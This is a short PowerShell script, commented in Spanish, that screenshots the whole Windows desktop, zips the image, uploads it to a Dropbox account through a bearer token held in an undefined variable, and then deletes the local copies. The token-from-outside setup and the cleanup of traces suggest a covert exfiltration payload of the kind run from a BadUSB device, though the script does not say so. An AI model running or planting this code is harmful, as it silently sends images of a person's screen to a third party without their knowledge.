function Capture-And-UploadScreenshot {
    # Crear directorio con fecha y hora actual para almacenar la captura
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory

    # Obtener información de la pantalla virtual
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen

    # Crear un bitmap del tamaño de la pantalla virtual
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width), 0))),([int32]([math]::round($($s.Height), 0)))
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Guardar la captura de pantalla en PNG
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $filePath = "$userDir\$fileName"
    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Comprimir el directorio que contiene la captura de pantalla
    Compress-Archive -Path $filePath -DestinationPath "$userDir.zip"
    $zipFile = "$userDir.zip"
    $dropboxUploadPath = "/Screenshots_$folderDateTime.zip"

    # Definir la función para subir el archivo ZIP a Dropbox
    function DropBox-Upload {
        [CmdletBinding()]
        param (
            [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
            [Alias("f")]
            [string]$SourceFilePath
        ) 
        $outputFile = Split-Path $SourceFilePath -leaf
        $TargetFilePath="/$outputFile"
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $db
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        try {
            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
            Write-Host "Archivo subido correctamente a Dropbox: $SourceFilePath"
        } catch {
            Write-Host "Error al subir el archivo a Dropbox: $_"
        }
    }

    # Subir el archivo ZIP a Dropbox
    if (-not ([string]::IsNullOrEmpty($db))) {
        DropBox-Upload -SourceFilePath $zipFile
    } else {
        Write-Host "No se encontró token de Dropbox, no se realizó la subida."
    }

    # Limpieza de archivos temporales
    Remove-Item -Path $userDir -Recurse
    Remove-Item -Path $zipFile
}

# Llamar a la función para ejecutar el proceso
Capture-And-UploadScreenshot
